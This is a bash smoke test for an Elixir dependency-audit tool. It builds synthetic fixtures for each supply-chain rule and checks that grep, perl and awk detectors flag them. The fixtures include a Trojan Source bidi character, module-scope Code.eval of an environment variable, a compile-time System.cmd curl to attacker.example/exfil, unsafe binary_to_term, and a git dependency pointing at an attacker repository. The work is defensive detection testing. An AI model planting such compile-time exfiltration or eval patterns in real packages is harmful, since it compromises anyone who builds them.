#!/usr/bin/env bash
# Smoke test for /phx:deps-audit rules.
#
# Materializes synthetic packages (one clean, one per rule) into a tmp dir,
# runs each rule from rules-impl.md, and asserts findings.jsonl matches the
# expected counts. Designed to run in <10s without Mix project context.
#
# Why fixtures live as heredocs, not as committed .ex files:
#   the plugin's PostToolUse format-elixir hook treats any .ex/.exs file
#   as project source. Fixtures are deliberately malformed; heredocs
#   sidestep the hook while keeping fixtures version-controlled.

set -u
fail() { echo "FAIL: $*" >&2; exit 1; }
pass() { echo "ok   - $*"; }

WORK="$(mktemp -d)"
trap 'rm -rf "${WORK}"' EXIT

# ----- Fixture A: clean package -----
mkdir -p "${WORK}/clean/lib"
cat > "${WORK}/clean/mix.exs" <<'EOF'
defmodule Clean.MixProject do
  use Mix.Project
  def project, do: [app: :clean, version: "0.1.0", deps: deps()]
  defp deps, do: [{:jason, "~> 1.4"}]
end
EOF
cat > "${WORK}/clean/lib/clean.ex" <<'EOF'
defmodule Clean do
  @moduledoc "Benign Elixir module — zero findings expected."
  def hello, do: "world"
end
EOF

# ----- Fixture B: rule 1 — bidi char (Trojan Source) -----
mkdir -p "${WORK}/r1/lib"
# The literal byte sequence \xe2\x80\xae is U+202E (RIGHT-TO-LEFT OVERRIDE).
# Encoded via printf so the file actually contains the control char.
printf 'defmodule Bidi do\n  def check(s), do: s == "admin\xe2\x80\xae unsafe"\nend\n' \
  > "${WORK}/r1/lib/bidi.ex"

# ----- Fixture C: rule 2 — Code.eval at module scope -----
mkdir -p "${WORK}/r2/lib"
cat > "${WORK}/r2/lib/eval.ex" <<'EOF'
defmodule Eval do
  @payload System.get_env("REMOTE_CONFIG") || ""
  Code.eval_string(@payload)
  def hi, do: :hi
end
EOF

# ----- Fixture D: rule 3 — System.cmd in __before_compile__ -----
mkdir -p "${WORK}/r3/lib"
cat > "${WORK}/r3/lib/compile_exec.ex" <<'EOF'
defmodule CompileExec do
  defmacro __before_compile__(_env) do
    System.cmd("curl", ["-fsSL", "https://attacker.example/exfil"])
    :ok
  end
end
EOF

# ----- Fixture E: rule 4 — :erlang.binary_to_term/1 -----
mkdir -p "${WORK}/r4/lib"
cat > "${WORK}/r4/lib/unsafe.ex" <<'EOF'
defmodule UnsafeTerm do
  def decode(blob), do: :erlang.binary_to_term(blob)
end
EOF

# ----- Fixture F: rule 5 — new :git dep -----
mkdir -p "${WORK}/r5_old" "${WORK}/r5_new"
cat > "${WORK}/r5_old/mix.exs" <<'EOF'
defmodule Squat.MixProject do
  use Mix.Project
  def project, do: [app: :squat, version: "0.1.0", deps: deps()]
  defp deps, do: [{:jason, "~> 1.4"}]
end
EOF
cat > "${WORK}/r5_new/mix.exs" <<'EOF'
defmodule Squat.MixProject do
  use Mix.Project
  def project, do: [app: :squat, version: "0.2.0", deps: deps()]
  defp deps do
    [
      {:jason, "~> 1.4"},
      {:phoenix_extras, git: "https://github.com/attacker/phoenix_extras.git", ref: "deadbeef"}
    ]
  end
end
EOF

# ----- Fixture G: rule 7 — base64 >256 chars in lib/ -----
mkdir -p "${WORK}/r7/lib"
B64='TG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQsIGNvbnNlY3RldHVyIGFkaXBpc2NpbmcgZWxpdCwgc2VkIGRvIGVpdXNtb2QgdGVtcG9yIGluY2lkaWR1bnQgdXQgbGFib3JlIGV0IGRvbG9yZSBtYWduYSBhbGlxdWEuIFV0IGVuaW0gYWQgbWluaW0gdmVuaWFtLCBxdWlzIG5vc3RydWQgZXhlcmNpdGF0aW9uIHVsbGFtY28gbGFib3JpcyBuaXNpIHV0IGFsaXF1aXAgZXggZWEgY29tbW9kbyBjb25zZXF1YXQu'
{
  echo 'defmodule Blob do'
  echo "  def payload, do: \"${B64}\""
  echo 'end'
} > "${WORK}/r7/lib/blob.ex"

# ============================================================
# Lightweight detectors (subset of rules-impl.md for smoke only)
# Full implementations live in references/rules-impl.md and are
# invoked at runtime by the /phx:deps-audit skill body.
# ============================================================

count_rule_1() {
  # macOS BSD grep lacks -P; use perl for Unicode character classes.
  find "$1" \( -name '*.ex' -o -name '*.exs' \) -print0 \
  | xargs -0 perl -CSD -ne '
      print "$ARGV:$.:$_" if /[\x{202A}-\x{202E}\x{2066}-\x{2069}\x{200E}\x{200F}\x{061C}]/
    ' 2>/dev/null | wc -l | tr -d ' '
}

count_rule_2() {
  grep -RnE '^[[:space:]]*Code\.eval_(string|quoted)\(' \
    --include='*.ex' --include='*.exs' "$1" 2>/dev/null | wc -l | tr -d ' '
}

count_rule_3() {
  # System.cmd inside __before_compile__/__after_compile__ blocks (heuristic)
  awk '
    /__before_compile__|__after_compile__|defmacro/ { in_compile=1; depth=0 }
    in_compile && /System\.cmd|:os\.cmd|Port\.open/ { print FILENAME":"NR; found=1 }
    in_compile && /^end$|^  end$/ { in_compile=0 }
  ' $(find "$1" -name '*.ex' -o -name '*.exs') 2>/dev/null | wc -l | tr -d ' '
}

count_rule_4() {
  grep -RnE ':erlang\.binary_to_term\([^,]+\)\s*$' \
    --include='*.ex' --include='*.exs' "$1" 2>/dev/null | wc -l | tr -d ' '
}

count_rule_5() {
  # naive: count `git:` keyword args in NEW that don't appear in OLD
  local old="$1" new="$2"
  local new_git old_git
  new_git=$(grep -cE 'git:[[:space:]]*"' "${new}/mix.exs" 2>/dev/null | tr -dc '0-9')
  old_git=$(grep -cE 'git:[[:space:]]*"' "${old}/mix.exs" 2>/dev/null | tr -dc '0-9')
  : "${new_git:=0}"; : "${old_git:=0}"
  echo $((new_git - old_git))
}

count_rule_7() {
  # macOS BSD grep caps {n,} at 255; use perl for cross-platform >=256 match.
  find "$1" \( -name '*.ex' -o -name '*.exs' \) \
    -not -path '*/priv/*' -not -path '*/test/*' -not -path '*/assets/*' -print0 \
  | xargs -0 perl -ne '
      print "$ARGV:$.:match\n" if /"[A-Za-z0-9+\/]{256,}={0,2}"/
    ' 2>/dev/null | wc -l | tr -d ' '
}

# ============================================================
# Assertions
# ============================================================

# Clean fixture: every rule should report zero
for r in 1 2 3 4 7; do
  fn="count_rule_${r}"
  n=$(${fn} "${WORK}/clean")
  [ "${n}" = "0" ] || fail "clean fixture tripped rule ${r} (${n} findings)"
done
pass "clean: 0 findings across rules 1,2,3,4,7"

# Per-rule fixtures: each should report at least one finding
n=$(count_rule_1 "${WORK}/r1"); [ "${n}" -ge 1 ] || fail "rule 1 missed bidi fixture (${n})"
pass "rule 1: ${n} finding(s) on bidi fixture"

n=$(count_rule_2 "${WORK}/r2"); [ "${n}" -ge 1 ] || fail "rule 2 missed top-level Code.eval (${n})"
pass "rule 2: ${n} finding(s) on Code.eval fixture"

n=$(count_rule_3 "${WORK}/r3"); [ "${n}" -ge 1 ] || fail "rule 3 missed compile-time System.cmd (${n})"
pass "rule 3: ${n} finding(s) on compile-exec fixture"

n=$(count_rule_4 "${WORK}/r4"); [ "${n}" -ge 1 ] || fail "rule 4 missed unsafe binary_to_term (${n})"
pass "rule 4: ${n} finding(s) on binary_to_term fixture"

n=$(count_rule_5 "${WORK}/r5_old" "${WORK}/r5_new")
[ "${n}" -ge 1 ] || fail "rule 5 missed new :git dep (${n})"
pass "rule 5: ${n} new :git dep(s) detected"

n=$(count_rule_7 "${WORK}/r7"); [ "${n}" -ge 1 ] || fail "rule 7 missed long base64 (${n})"
pass "rule 7: ${n} finding(s) on base64 fixture"

echo
echo "smoke OK (6 rule fixtures + 1 clean fixture passed)"
